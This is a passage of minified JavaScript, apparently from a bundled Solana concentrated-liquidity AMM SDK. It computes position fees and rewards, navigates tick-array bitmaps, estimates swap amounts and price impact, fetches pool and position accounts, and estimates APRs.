            ? ((i = n.feeGrowthOutsideX64A), (s = n.feeGrowthOutsideX64B))
            : ((i = t.feeGrowthGlobalX64A.sub(n.feeGrowthOutsideX64A)),
              (s = t.feeGrowthGlobalX64B.sub(n.feeGrowthOutsideX64B))),
          {
            feeGrowthInsideX64A: MB.wrappingSubU128(
              MB.wrappingSubU128(t.feeGrowthGlobalX64A, r),
              i
            ),
            feeGrowthInsideBX64: MB.wrappingSubU128(
              MB.wrappingSubU128(t.feeGrowthGlobalX64B, o),
              s
            ),
          }
        );
      }
      static GetPositionFees(t, e, n, r) {
        let { feeGrowthInsideX64A: o, feeGrowthInsideBX64: i } =
            this.getfeeGrowthInside(t, n, r),
          s = MB.mulDivFloor(
            MB.wrappingSubU128(o, e.feeGrowthInsideLastX64A),
            e.liquidity,
            jC
          ),
          a = e.tokenFeesOwedA.add(s),
          u = MB.mulDivFloor(
            MB.wrappingSubU128(i, e.feeGrowthInsideLastX64B),
            e.liquidity,
            jC
          );
        return { tokenFeeAmountA: a, tokenFeeAmountB: e.tokenFeesOwedB.add(u) };
      }
      static GetPositionFeesV2(t, e, n, r) {
        let { feeGrowthInsideX64A: o, feeGrowthInsideBX64: i } =
            this.getfeeGrowthInside(t, n, r),
          s = MB.mulDivFloor(
            MB.wrappingSubU128(o, e.feeGrowthInsideLastX64A),
            e.liquidity,
            jC
          ),
          a = e.tokenFeesOwedA.add(s),
          u = MB.mulDivFloor(
            MB.wrappingSubU128(i, e.feeGrowthInsideLastX64B),
            e.liquidity,
            jC
          );
        return { tokenFeeAmountA: a, tokenFeeAmountB: e.tokenFeesOwedB.add(u) };
      }
      static GetPositionRewardsV2(t, e, n, r) {
        let o = [],
          i = this.getRewardGrowthInsideV2(t.tickCurrent, n, r, t.rewardInfos);
        for (let s = 0; s < i.length; s++) {
          let t = i[s],
            n = e.rewardInfos[s],
            r = MB.wrappingSubU128(t, n.growthInsideLastX64),
            a = MB.mulDivFloor(r, e.liquidity, jC),
            u = n.rewardAmountOwed.add(a);
          o.push(u);
        }
        return o;
      }
      static GetPositionRewards(t, e, n, r) {
        let o = [],
          i = this.getRewardGrowthInside(t.tickCurrent, n, r, t.rewardInfos);
        for (let s = 0; s < i.length; s++) {
          let t = i[s],
            n = e.rewardInfos[s],
            r = MB.wrappingSubU128(t, n.growthInsideLastX64),
            a = MB.mulDivFloor(r, e.liquidity, jC),
            u = n.rewardAmountOwed.add(a);
          o.push(u);
        }
        return o;
      }
      static getRewardGrowthInside(t, e, n, r) {
        let o = [];
        for (let i = 0; i < r.length; i++) {
          let s = new Zn(0);
          s = e.liquidityGross.eqn(0)
            ? r[i].rewardGrowthGlobalX64
            : t < e.tick
            ? r[i].rewardGrowthGlobalX64.sub(e.rewardGrowthsOutsideX64[i])
            : e.rewardGrowthsOutsideX64[i];
          let a = new Zn(0);
          n.liquidityGross.eqn(0) ||
            (a =
              t < n.tick
                ? n.rewardGrowthsOutsideX64[i]
                : r[i].rewardGrowthGlobalX64.sub(n.rewardGrowthsOutsideX64[i])),
            o.push(
              MB.wrappingSubU128(
                MB.wrappingSubU128(r[i].rewardGrowthGlobalX64, s),
                a
              )
            );
        }
        return o;
      }
      static getRewardGrowthInsideV2(t, e, n, r) {
        let o = [];
        for (let i = 0; i < r.length; i++) {
          let s = new Zn(0);
          s = e.liquidityGross.eqn(0)
            ? r[i].rewardGrowthGlobalX64
            : t < e.tick
            ? r[i].rewardGrowthGlobalX64.sub(e.rewardGrowthsOutsideX64[i])
            : e.rewardGrowthsOutsideX64[i];
          let a = new Zn(0);
          n.liquidityGross.eqn(0) ||
            (a =
              t < n.tick
                ? n.rewardGrowthsOutsideX64[i]
                : r[i].rewardGrowthGlobalX64.sub(n.rewardGrowthsOutsideX64[i])),
            o.push(
              MB.wrappingSubU128(
                MB.wrappingSubU128(r[i].rewardGrowthGlobalX64, s),
                a
              )
            );
        }
        return o;
      }
      static getAmountsFromLiquidity({
        poolInfo: t,
        ownerPosition: e,
        liquidity: n,
        slippage: r,
        add: o,
        epochInfo: i,
      }) {
        var s, a, u, c;
        let l = DB.priceToSqrtPriceX64(
            new mI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          d = DB.getSqrtPriceX64FromTick(e.tickLower),
          f = DB.getSqrtPriceX64FromTick(e.tickUpper),
          h = o ? 1 + r : 1 - r,
          p = qB.getAmountsFromLiquidity(l, d, f, n, o),
          [m, g] = [
            D_(
              p.amountA,
              null == (s = t.mintA.extensions) ? void 0 : s.feeConfig,
              i,
              !0
            ),
            D_(
              p.amountB,
              null == (a = t.mintB.extensions) ? void 0 : a.feeConfig,
              i,
              !0
            ),
          ],
          [y, w] = [
            D_(
              new Zn(new mI(p.amountA.toString()).mul(h).toFixed(0)),
              null == (u = t.mintA.extensions) ? void 0 : u.feeConfig,
              i,
              !0
            ),
            D_(
              new Zn(new mI(p.amountB.toString()).mul(h).toFixed(0)),
              null == (c = t.mintB.extensions) ? void 0 : c.feeConfig,
              i,
              !0
            ),
          ];
        return {
          liquidity: n,
          amountA: m,
          amountB: g,
          amountSlippageA: y,
          amountSlippageB: w,
          expirationTime: U_(m.expirationTime, g.expirationTime),
        };
      }
    },
    EB = class {
      static async getTickArrays(t, e, n, r, o, i, s) {
        let a = [],
          u = FB.getTickArrayStartIndexByTick(r, o),
          c = FB.getInitializedTickArrayInRange(i, s, o, u, Math.floor(7.5));
        for (let f = 0; f < c.length; f++) {
          let { publicKey: t } = yB(e, n, c[f]);
          a.push(t);
        }
        let l = (await EA(t, a)).map((t) =>
            null !== t ? QB.decode(t.data) : null
          ),
          d = {};
        for (let f = 0; f < a.length; f++) {
          let t = l[f];
          null !== t &&
            (d[t.startTickIndex] = AA(vA({}, t), { address: a[f] }));
        }
        return d;
      }
      static nextInitializedTick(t, e, n, r, o, i) {
        let {
          initializedTick: s,
          tickArrayAddress: a,
          tickArrayStartTickIndex: u,
        } = this.nextInitializedTickInOneArray(t, e, n, r, o, i);
        for (; null == s || s.liquidityGross.lten(0); ) {
          if (
            ((u = FB.getNextTickArrayStartIndex(u, o, i)),
            this.checkIsValidStartIndex(u, o))
          )
            throw new Error("No enough initialized tickArray");
          let r = n[u];
          if (void 0 === r) continue;
          let {
            nextTick: c,
            tickArrayAddress: l,
            tickArrayStartTickIndex: d,
          } = this.firstInitializedTickInOneArray(t, e, r, i);
          [s, a, u] = [c, l, d];
        }
        if (null == s) throw new Error("No invaild tickArray cache");
        return { nextTick: s, tickArrayAddress: a, tickArrayStartTickIndex: u };
      }
      static nextInitializedTickArray(t, e, n, r, o) {
        let i = Math.floor(t / EB.tickCount(e)),
          s = n
            ? FB.searchLowBitFromStart(r, o, i - 1, 1, e)
            : FB.searchHightBitFromStart(r, o, i + 1, 1, e);
        return s.length > 0
          ? { isExist: !0, nextStartIndex: s[0] }
          : { isExist: !1, nextStartIndex: 0 };
      }
      static firstInitializedTickInOneArray(t, e, n, r) {
        let o;
        if (r) {
          let t = zB - 1;
          for (; t >= 0; ) {
            let e = n.ticks[t];
            if (e.liquidityGross.gtn(0)) {
              o = e;
              break;
            }
            t -= 1;
          }
        } else {
          let t = 0;
          for (; t < zB; ) {
            let e = n.ticks[t];
            if (e.liquidityGross.gtn(0)) {
              o = e;
              break;
            }
            t += 1;
          }
        }
        let { publicKey: i } = yB(t, e, n.startTickIndex);
        return {
          nextTick: o,
          tickArrayAddress: i,
          tickArrayStartTickIndex: n.startTickIndex,
        };
      }
      static nextInitializedTickInOneArray(t, e, n, r, o, i) {
        let s,
          a = FB.getTickArrayStartIndexByTick(r, o),
          u = Math.floor((r - a) / o),
          c = n[a];
        if (null == c)
          return {
            initializedTick: void 0,
            tickArrayAddress: void 0,
            tickArrayStartTickIndex: a,
          };
        if (i)
          for (; u >= 0; ) {
            let t = c.ticks[u];
            if (t.liquidityGross.gtn(0)) {
              s = t;
              break;
            }
            u -= 1;
          }
        else
          for (u += 1; u < zB; ) {
            let t = c.ticks[u];
            if (t.liquidityGross.gtn(0)) {
              s = t;
              break;
            }
            u += 1;
          }
        let { publicKey: l } = yB(t, e, a);
        return {
          initializedTick: s,
          tickArrayAddress: l,
          tickArrayStartTickIndex: c.startTickIndex,
        };
      }
      static getArrayStartIndex(t, e) {
        let n = this.tickCount(e);
        return Math.floor(t / n) * n;
      }
      static checkIsValidStartIndex(t, e) {
        if (FB.checkIsOutOfBoundary(t)) {
          if (t > ZC) return !1;
          return t == FB.getTickArrayStartIndexByTick(XC, e);
        }
        return t % this.tickCount(e) == 0;
      }
      static tickCount(t) {
        return zB * t;
      }
    },
    xB = class {
      static maxTickInTickarrayBitmap(t) {
        return t * zB * KB;
      }
      static getBitmapTickBoundary(t, e) {
        let n = this.maxTickInTickarrayBitmap(e),
          r = Math.floor(Math.abs(t) / n);
        t < 0 && Math.abs(t) % n != 0 && (r += 1);
        let o = n * r;
        return t < 0
          ? { minValue: -o, maxValue: -o + n }
          : { minValue: o, maxValue: o + n };
      }
      static nextInitializedTickArrayStartIndex(t, e, n, r) {
        if (!EB.checkIsValidStartIndex(e, n))
          throw Error("nextInitializedTickArrayStartIndex check error");
        let o = this.maxTickInTickarrayBitmap(n),
          i = r ? e - EB.tickCount(n) : e + EB.tickCount(n);
        if (i < -o || i >= o) return { isInit: !1, tickIndex: e };
        let s = n * zB,
          a = i / s + 512;
        i < 0 && i % s != 0 && a--;
        let u = Math.abs(a);
        if (r) {
          let e = (function (t, e) {
            return aB(t, e) ? null : iB(t, e);
          })(1024, t.shln(1024 - u - 1));
          if (null !== e) {
            return { isInit: !0, tickIndex: (u - e - 512) * s };
          }
          return { isInit: !1, tickIndex: -o };
        }
        {
          let e = (function (t, e) {
            return aB(t, e) ? null : sB(t, e);
          })(1024, t.shrn(u));
          if (null !== e) {
            return { isInit: !0, tickIndex: (u + e - 512) * s };
          }
          return { isInit: !1, tickIndex: o - EB.tickCount(n) };
        }
      }
    },
    PB = class {
      static getBitmapOffset(t, e) {
        if (!EB.checkIsValidStartIndex(t, e))
          throw new Error("No enough initialized tickArray");
        this.checkExtensionBoundary(t, e);
        let n = xB.maxTickInTickarrayBitmap(e),
          r = Math.floor(Math.abs(t) / n) - 1;
        return t < 0 && Math.abs(t) % n === 0 && r--, r;
      }
      static getBitmap(t, e, n) {
        let r = this.getBitmapOffset(t, e);
        return t < 0
          ? { offset: r, tickarrayBitmap: n.negativeTickArrayBitmap[r] }
          : { offset: r, tickarrayBitmap: n.positiveTickArrayBitmap[r] };
      }
      static checkExtensionBoundary(t, e) {
        let { positiveTickBoundary: n, negativeTickBoundary: r } =
          this.extensionTickBoundary(e);
        if (t >= r && t < n)
          throw Error("checkExtensionBoundary -> InvalidTickArrayBoundary");
      }
      static extensionTickBoundary(t) {
        let e = xB.maxTickInTickarrayBitmap(t),
          n = -e;
        if (ZC <= e)
          throw Error(`extensionTickBoundary check error: ${ZC}, ${e}`);
        if (n <= XC)
          throw Error(`extensionTickBoundary check error: ${n}, ${XC}`);
        return { positiveTickBoundary: e, negativeTickBoundary: n };
      }
      static checkTickArrayIsInit(t, e, n) {
        let { tickarrayBitmap: r } = this.getBitmap(t, e, n),
          o = this.tickArrayOffsetInBitmap(t, e);
        return {
          isInitialized: FB.mergeTickArrayBitmap(r).testn(o),
          startIndex: t,
        };
      }
      static nextInitializedTickArrayFromOneBitmap(t, e, n, r) {
        let o = EB.tickCount(e),
          i = n ? t - o : t + o,
          { tickarrayBitmap: s } = this.getBitmap(i, e, r);
        return this.nextInitializedTickArrayInBitmap(s, i, e, n);
      }
      static nextInitializedTickArrayInBitmap(t, e, n, r) {
        let { minValue: o, maxValue: i } = xB.getBitmapTickBoundary(e, n),
          s = this.tickArrayOffsetInBitmap(e, n);
        if (r) {
          let r = FB.mergeTickArrayBitmap(t).shln(KB - 1 - s),
            i = aB(512, r) ? null : iB(512, r);
          if (null !== i) {
            return { isInit: !0, tickIndex: e - i * EB.tickCount(n) };
          }
          return { isInit: !1, tickIndex: o };
        }
        {
          let r = FB.mergeTickArrayBitmap(t).shrn(s),
            o = aB(512, r) ? null : sB(512, r);
          if (null !== o) {
            return { isInit: !0, tickIndex: e + o * EB.tickCount(n) };
          }
          return { isInit: !1, tickIndex: i - EB.tickCount(n) };
        }
      }
      static tickArrayOffsetInBitmap(t, e) {
        let n = Math.abs(t) % xB.maxTickInTickarrayBitmap(e),
          r = Math.floor(n / EB.tickCount(e));
        return t < 0 && 0 != n && (r = KB - r), r;
      }
    },
    RB = class {
      static getOutputAmountAndRemainAccounts(t, e, n, r, o, i = !1) {
        let s = n.toBase58() === t.mintA.address,
          a = [],
          {
            isExist: u,
            startIndex: c,
            nextAccountMeta: l,
          } = this.getFirstInitializedTickArray(t, s);
        if (!u || void 0 === c || !l) throw new Error("Invalid tick array");
        a.push(l);
        let {
          allTrade: d,
          amountCalculated: f,
          accounts: h,
          sqrtPriceX64: p,
          feeAmount: m,
        } = WB.swapCompute(
          t.programId,
          t.id,
          e,
          t.tickArrayBitmap,
          t.exBitmapInfo,
          s,
          t.ammConfig.tradeFeeRate,
          t.liquidity,
          t.tickCurrent,
          t.tickSpacing,
          t.sqrtPriceX64,
          r,
          c,
          o,
          i
        );
        return (
          a.push(...h),
          {
            allTrade: d,
            expectedAmountOut: f.mul(FC),
            remainingAccounts: a,
            executionPrice: p,
            feeAmount: m,
          }
        );
      }
      static getInputAmountAndRemainAccounts(t, e, n, r, o) {
        let i = n.toBase58() === t.mintB.address,
          s = [],
          {
            isExist: a,
            startIndex: u,
            nextAccountMeta: c,
          } = this.getFirstInitializedTickArray(t, i);
        if (!a || void 0 === u || !c) throw new Error("Invalid tick array");
        try {
          let e = this.preInitializedTickArrayStartIndex(t, i);
          if (e.isExist) {
            let { publicKey: n } = yB(t.programId, t.id, e.nextStartIndex);
            s.push(n);
          }
        } catch {}
        s.push(c);
        let {
          amountCalculated: l,
          accounts: d,
          sqrtPriceX64: f,
          feeAmount: h,
        } = WB.swapCompute(
          t.programId,
          t.id,
          e,
          t.tickArrayBitmap,
          t.exBitmapInfo,
          i,
          t.ammConfig.tradeFeeRate,
          t.liquidity,
          t.tickCurrent,
          t.tickSpacing,
          t.sqrtPriceX64,
          r.mul(FC),
          u,
          o
        );
        return (
          s.push(...d),
          {
            expectedAmountIn: l,
            remainingAccounts: s,
            executionPrice: f,
            feeAmount: h,
          }
        );
      }
      static getFirstInitializedTickArray(t, e) {
        let { isInitialized: n, startIndex: r } =
          RB.isOverflowDefaultTickarrayBitmap(t.tickSpacing, [t.tickCurrent])
            ? PB.checkTickArrayIsInit(
                EB.getArrayStartIndex(t.tickCurrent, t.tickSpacing),
                t.tickSpacing,
                t.exBitmapInfo
              )
            : FB.checkTickArrayIsInitialized(
                FB.mergeTickArrayBitmap(t.tickArrayBitmap),
                t.tickCurrent,
                t.tickSpacing
              );
        if (n) {
          let { publicKey: e } = yB(t.programId, t.id, r);
          return { isExist: !0, startIndex: r, nextAccountMeta: e };
        }
        let { isExist: o, nextStartIndex: i } =
          this.nextInitializedTickArrayStartIndex(
            t,
            EB.getArrayStartIndex(t.tickCurrent, t.tickSpacing),
            e
          );
        if (o) {
          let { publicKey: e } = yB(t.programId, t.id, i);
          return { isExist: !0, startIndex: i, nextAccountMeta: e };
        }
        return { isExist: !1, nextAccountMeta: void 0, startIndex: void 0 };
      }
      static preInitializedTickArrayStartIndex(t, e) {
        let n = Math.floor(t.tickCurrent / EB.tickCount(t.tickSpacing)),
          r = e
            ? FB.searchHightBitFromStart(
                t.tickArrayBitmap,
                t.exBitmapInfo,
                n + 1,
                1,
                t.tickSpacing
              )
            : FB.searchLowBitFromStart(
                t.tickArrayBitmap,
                t.exBitmapInfo,
                n - 1,
                1,
                t.tickSpacing
              );
        return r.length > 0
          ? { isExist: !0, nextStartIndex: r[0] }
          : { isExist: !1, nextStartIndex: 0 };
      }
      static nextInitializedTickArrayStartIndex(t, e, n) {
        for (e = EB.getArrayStartIndex(t.tickCurrent, t.tickSpacing); ; ) {
          let { isInit: r, tickIndex: o } =
            xB.nextInitializedTickArrayStartIndex(
              FB.mergeTickArrayBitmap(t.tickArrayBitmap),
              e,
              t.tickSpacing,
              n
            );
          if (r) return { isExist: !0, nextStartIndex: o };
          e = o;
          let { isInit: i, tickIndex: s } =
            PB.nextInitializedTickArrayFromOneBitmap(
              e,
              t.tickSpacing,
              n,
              t.exBitmapInfo
            );
          if (i) return { isExist: !0, nextStartIndex: s };
          if ((e = s) < XC || e > ZC) return { isExist: !1, nextStartIndex: 0 };
        }
      }
      static async updatePoolRewardInfos({
        connection: t,
        apiPoolInfo: e,
        chainTime: n,
        poolLiquidity: r,
        rewardInfos: o,
      }) {
        var i, s, a;
        let u = [];
        for (let c = 0; c < o.length; c++) {
          let l = o[c],
            d =
              null !=
              (a =
                null == (i = e.rewardDefaultInfos[c])
                  ? void 0
                  : i.mint.programId)
                ? a
                : null == (s = await t.getAccountInfo(l.tokenMint))
                ? void 0
                : s.owner;
          if (void 0 === d) throw Error("get new reward mint info error");
          let f = AA(vA({}, l), {
            perSecond: MB.x64ToDecimal(l.emissionsPerSecondX64),
            remainingRewards: void 0,
            tokenProgramId: new Xi(d),
          });
          if (f.tokenMint.equals(Xi.default)) continue;
          if (n <= f.openTime.toNumber() || r.eq(zC)) {
            u.push(f);
            continue;
          }
          let h = new Zn(Math.min(f.endTime.toNumber(), n)),
            p = h.sub(f.lastUpdateTime),
            m = MB.mulDivFloor(p, f.emissionsPerSecondX64, r),
            g = f.rewardGrowthGlobalX64.add(m),
            y = MB.mulDivFloor(p, f.emissionsPerSecondX64, jC),
            w = f.rewardTotalEmissioned.add(y);
          u.push(
            AA(vA({}, f), {
              rewardGrowthGlobalX64: g,
              rewardTotalEmissioned: w,
              lastUpdateTime: h,
            })
          );
        }
        return u;
      }
      static isOverflowDefaultTickarrayBitmap(t, e) {
        let { maxTickBoundary: n, minTickBoundary: r } = this.tickRange(t);
        for (let o of e) {
          let e = FB.getTickArrayStartIndexByTick(o, t);
          if (e >= n || e < r) return !0;
        }
        return !1;
      }
      static tickRange(t) {
        let e = xB.maxTickInTickarrayBitmap(t),
          n = -e;
        return (
          e > ZC && (e = EB.getArrayStartIndex(ZC, t) + EB.tickCount(t)),
          n < XC && (n = EB.getArrayStartIndex(XC, t)),
          { maxTickBoundary: e, minTickBoundary: n }
        );
      }
      static get_tick_array_offset(t, e) {
        if (!EB.checkIsValidStartIndex(t, e))
          throw new Error("No enough initialized tickArray");
        return (t / EB.tickCount(e)) * KB;
      }
      static async fetchExBitmaps({
        connection: t,
        exBitmapAddress: e,
        batchRequest: n,
      }) {
        let r = await xA(
            t,
            e.map((t) => ({ pubkey: t })),
            { batchRequest: n }
          ),
          o = {};
        for (let i of r)
          null !== i.accountInfo &&
            (o[i.pubkey.toString()] = tE.decode(i.accountInfo.data));
        return o;
      }
      static async fetchMultiplePoolTickArrays({
        connection: t,
        poolKeys: e,
        batchRequest: n,
      }) {
        let r = {},
          o = [];
        for (let a of e) {
          let t = FB.getTickArrayStartIndexByTick(a.tickCurrent, a.tickSpacing),
            e = FB.getInitializedTickArrayInRange(
              a.tickArrayBitmap,
              a.exBitmapInfo,
              a.tickSpacing,
              t,
              7
            );
          for (let n of e) {
            let { publicKey: t } = yB(a.programId, a.id, n);
            o.push({ pubkey: t }), (r[t.toString()] = a.id);
          }
        }
        let i = await xA(t, o, { batchRequest: n }),
          s = {};
        for (let a of i) {
          if (!a.accountInfo) continue;
          let t = r[a.pubkey.toString()];
          if (!t) continue;
          void 0 === s[t.toString()] && (s[t.toString()] = {});
          let e = QB.decode(a.accountInfo.data);
          s[t.toString()][e.startTickIndex] = AA(vA({}, e), {
            address: a.pubkey,
          });
        }
        return s;
      }
      static async fetchPoolsAccountPosition({
        pools: t,
        connection: e,
        ownerInfo: n,
        batchRequest: r = !1,
        updateOwnerRewardAndFee: o = !0,
      }) {
        var i;
        let s = [];
        for (let a = 0; a < t.length; a++) {
          let e = t[a];
          null !== e &&
            (s.find((t) => t.equals(e.state.programId)) ||
              s.push(e.state.programId));
        }
        if (n) {
          let a = n.tokenAccounts.map((t) => t.accountInfo.mint),
            u = [];
          for (let t of a) for (let e of s) u.push(bB(e, t).publicKey);
          let c = await EA(e, u, { batchRequest: r }),
            l = {};
          for (let e of c) {
            if (null === e) continue;
            let n = JB.decode(e.data),
              r = n.poolId.toString(),
              o = t.find((t) => t.state.id.toBase58() === r);
            if (void 0 === o) continue;
            let s = o.state,
              a = FB._getTickPriceLegacy({
                poolInfo: s,
                tick: n.tickLower,
                baseIn: !0,
              }),
              u = FB._getTickPriceLegacy({
                poolInfo: s,
                tick: n.tickUpper,
                baseIn: !0,
              }),
              { amountA: c, amountB: d } = qB.getAmountsFromLiquidity(
                s.sqrtPriceX64,
                a.tickSqrtPriceX64,
                u.tickSqrtPriceX64,
                n.liquidity,
                !1
              ),
              f =
                1 / (1 - Math.sqrt(Math.sqrt(a.price.div(u.price).toNumber())));
            o.positionAccount = [
              ...(null != (i = o.positionAccount) ? i : []),
              {
                poolId: n.poolId,
                nftMint: n.nftMint,
                priceLower: a.price,
                priceUpper: u.price,
                amountA: c,
                amountB: d,
                tickLower: n.tickLower,
                tickUpper: n.tickUpper,
                liquidity: n.liquidity,
                feeGrowthInsideLastX64A: n.feeGrowthInsideLastX64A,
                feeGrowthInsideLastX64B: n.feeGrowthInsideLastX64B,
                tokenFeesOwedA: n.tokenFeesOwedA,
                tokenFeesOwedB: n.tokenFeesOwedB,
                rewardInfos: n.rewardInfos.map((t) =>
                  AA(vA({}, t), { pendingReward: new Zn(0) })
                ),
                leverage: f,
                tokenFeeAmountA: new Zn(0),
                tokenFeeAmountB: new Zn(0),
              },
            ];
            let h = await FB.getTickArrayAddressByTick(
                o.state.programId,
                n.poolId,
                n.tickLower,
                o.state.tickSpacing
              ),
              p = await FB.getTickArrayAddressByTick(
                o.state.programId,
                n.poolId,
                n.tickUpper,
                o.state.tickSpacing
              );
            (l[
              `${o.state.programId.toString()}-${n.poolId.toString()}-${
                n.tickLower
              }`
            ] = h),
              (l[
                `${o.state.programId.toString()}-${n.poolId.toString()}-${
                  n.tickUpper
                }`
              ] = p);
          }
          if (o) {
            let n = Object.values(l),
              o = await EA(e, n, { batchRequest: r }),
              i = {};
            for (let t = 0; t < n.length; t++) {
              let e = o[t];
              null !== e && (i[n[t].toString()] = QB.decode(e.data));
            }
            for (let { state: e, positionAccount: r } of t)
              if (r)
                for (let t of r) {
                  let n = `${e.programId.toString()}-${e.id.toString()}-${
                      t.tickLower
                    }`,
                    r = `${e.programId.toString()}-${e.id.toString()}-${
                      t.tickUpper
                    }`,
                    o = i[l[n].toString()],
                    s = i[l[r].toString()],
                    a =
                      o.ticks[
                        FB.getTickOffsetInArray(t.tickLower, e.tickSpacing)
                      ],
                    u =
                      s.ticks[
                        FB.getTickOffsetInArray(t.tickUpper, e.tickSpacing)
                      ],
                    { tokenFeeAmountA: c, tokenFeeAmountB: d } =
                      await BB.GetPositionFees(e, t, a, u),
                    f = await BB.GetPositionRewards(e, t, a, u);
                  (t.tokenFeeAmountA = c.gte(new Zn(0)) ? c : new Zn(0)),
                    (t.tokenFeeAmountB = d.gte(new Zn(0)) ? d : new Zn(0));
                  for (let e = 0; e < f.length; e++)
                    t.rewardInfos[e].pendingReward = f[e].gte(new Zn(0))
                      ? f[e]
                      : new Zn(0);
                }
          }
        }
        return t;
      }
      static computeAmountOut({
        poolInfo: t,
        tickArrayCache: e,
        baseMint: n,
        epochInfo: r,
        amountIn: o,
        slippage: i,
        priceLimit: s = new mI(0),
        catchLiquidityInsufficient: a = !1,
      }) {
        var u;
        let c,
          l = n.toBase58() === t.mintA.address,
          [d, f] = l
            ? [t.mintA.extensions.feeConfig, t.mintB.extensions.feeConfig]
            : [t.mintB.extensions.feeConfig, t.mintA.extensions.feeConfig];
        c = s.equals(new mI(0))
          ? l
            ? JC.add(new Zn(1))
            : YC.sub(new Zn(1))
          : DB.priceToSqrtPriceX64(s, t.mintA.decimals, t.mintB.decimals);
        let h = D_(o, d, r, !1),
          {
            allTrade: p,
            expectedAmountOut: m,
            remainingAccounts: g,
            executionPrice: y,
            feeAmount: w,
          } = RB.getOutputAmountAndRemainAccounts(
            t,
            e,
            n,
            h.amount.sub(null != (u = h.fee) ? u : zC),
            c,
            a
          ),
          b = D_(m, f, r, !1),
          v = DB.sqrtPriceX64ToPrice(y, t.mintA.decimals, t.mintB.decimals),
          A = l ? v : new mI(1).div(v),
          k = D_(
            m.mul(new Zn(Math.floor(1e10 * (1 - i)))).div(new Zn(1e10)),
            f,
            r,
            !1
          ),
          I = l ? t.currentPrice : new mI(1).div(t.currentPrice),
          S = new mI(A).sub(I).abs(),
          _ = I,
          T = new XI(
            new mI(S).mul(10 ** 15).toFixed(0),
            new mI(_).mul(10 ** 15).toFixed(0)
          );
        return {
          allTrade: p,
          realAmountIn: h,
          amountOut: b,
          minAmountOut: k,
          expirationTime: U_(h.expirationTime, b.expirationTime),
          currentPrice: t.currentPrice,
          executionPrice: A,
          priceImpact: T,
          fee: w,
          remainingAccounts: g,
          executionPriceX64: y,
        };
      }
      static computeAmountOutFormat({
        poolInfo: t,
        tickArrayCache: e,
        amountIn: n,
        tokenOut: r,
        slippage: o,
        epochInfo: i,
        catchLiquidityInsufficient: s = !1,
      }) {
        let a = r.address === t.mintB.address,
          [u, c] = a ? [t.mintA, t.mintB] : [t.mintB, t.mintA],
          [l, d] = [
            new GI(
              AA(vA({}, u), {
                mint: u.address,
                isToken2022: u.programId === Tc.toBase58(),
              })
            ),
            new GI(
              AA(vA({}, c), {
                mint: c.address,
                isToken2022: c.programId === Tc.toBase58(),
              })
            ),
          ],
          {
            allTrade: f,
            realAmountIn: h,
            amountOut: p,
            minAmountOut: m,
            expirationTime: g,
            currentPrice: y,
            executionPrice: w,
            priceImpact: b,
            fee: v,
            remainingAccounts: A,
            executionPriceX64: k,
          } = RB.computeAmountOut({
            poolInfo: t,
            tickArrayCache: e,
            baseMint: new Xi(u.address),
            amountIn: n,
            slippage: o,
            epochInfo: i,
            catchLiquidityInsufficient: s,
          });
        return {
          allTrade: f,
          realAmountIn: AA(vA({}, h), {
            amount: new BI(l, h.amount),
            fee: void 0 === h.fee ? void 0 : new BI(l, h.fee),
          }),
          amountOut: AA(vA({}, p), {
            amount: new BI(d, p.amount),
            fee: void 0 === p.fee ? void 0 : new BI(d, p.fee),
          }),
          minAmountOut: AA(vA({}, m), {
            amount: new BI(d, m.amount),
            fee: void 0 === m.fee ? void 0 : new BI(d, m.fee),
          }),
          expirationTime: g,
          currentPrice: new JI({
            baseToken: l,
            denominator: new Zn(10).pow(new Zn(20 + l.decimals)),
            quoteToken: d,
            numerator: y.mul(new mI(10 ** (20 + d.decimals))).toFixed(0),
          }),
          executionPrice: new JI({
            baseToken: l,
            denominator: new Zn(10).pow(new Zn(20 + l.decimals)),
            quoteToken: d,
            numerator: w.mul(new mI(10 ** (20 + d.decimals))).toFixed(0),
          }),
          priceImpact: b,
          fee: new BI(l, v),
          remainingAccounts: A,
          executionPriceX64: k,
        };
      }
      static computeAmountIn({
        poolInfo: t,
        tickArrayCache: e,
        baseMint: n,
        epochInfo: r,
        amountOut: o,
        slippage: i,
        priceLimit: s = new mI(0),
      }) {
        var a;
        let u,
          c = n.toBase58() === t.mintA.address,
          l = {
            [t.mintA.address]: t.mintA.extensions.feeConfig,
            [t.mintB.address]: t.mintB.extensions.feeConfig,
          };
        u = s.equals(new mI(0))
          ? c
            ? YC.sub(new Zn(1))
            : JC.add(new Zn(1))
          : DB.priceToSqrtPriceX64(s, t.mintA.decimals, t.mintB.decimals);
        let d = D_(o, l[n.toString()], r, !0),
          {
            expectedAmountIn: f,
            remainingAccounts: h,
            executionPrice: p,
            feeAmount: m,
          } = RB.getInputAmountAndRemainAccounts(
            t,
            e,
            n,
            d.amount.sub(null != (a = d.fee) ? a : zC),
            u
          ),
          g = c ? t.mintB.address : t.mintA.address,
          y = D_(f, l[g], r, !1),
          w = DB.sqrtPriceX64ToPrice(p, t.mintA.decimals, t.mintB.decimals),
          b = c ? w : new mI(1).div(w),
          v = D_(
            f.mul(new Zn(Math.floor(1e10 * (1 + i)))).div(new Zn(1e10)),
            l[g],
            r,
            !0
          ),
          A = c ? t.currentPrice : new mI(1).div(t.currentPrice),
          k = new mI(b).sub(A).abs(),
          I = A,
          S = new XI(
            new mI(k).mul(10 ** 15).toFixed(0),
            new mI(I).mul(10 ** 15).toFixed(0)
          );
        return {
          amountIn: y,
          maxAmountIn: v,
          realAmountOut: d,
          expirationTime: U_(y.expirationTime, d.expirationTime),
          currentPrice: t.currentPrice,
          executionPrice: b,
          priceImpact: S,
          fee: m,
          remainingAccounts: h,
        };
      }
      static estimateAprsForPriceRangeMultiplier({
        poolInfo: t,
        aprType: e,
        positionTickLowerIndex: n,
        positionTickUpperIndex: r,
      }) {
        var o, i, s;
        let a,
          u = t[e],
          c = FB.getTickPrice({
            poolInfo: t,
            tick: n,
            baseIn: !0,
          }).price.toNumber(),
          l = FB.getTickPrice({
            poolInfo: t,
            tick: r,
            baseIn: !0,
          }).price.toNumber(),
          d = Math.max(c, u.priceMin),
          f = Math.min(l, u.priceMax) - d,
          h = l - c,
          p = u.priceMax - u.priceMin;
        return (
          (a =
            f <= 0 ? 0 : h === f ? p / f : p === f ? f / h : (f / p) * (f / h)),
          {
            feeApr: u.feeApr * a,
            rewardsApr: [
              (null != (o = u.rewardApr[0]) ? o : 0) * a,
              (null != (i = u.rewardApr[1]) ? i : 0) * a,
              (null != (s = u.rewardApr[2]) ? s : 0) * a,
            ],
            apr: u.apr * a,
          }
        );
      }
      static estimateAprsForPriceRangeDelta({
        poolInfo: t,
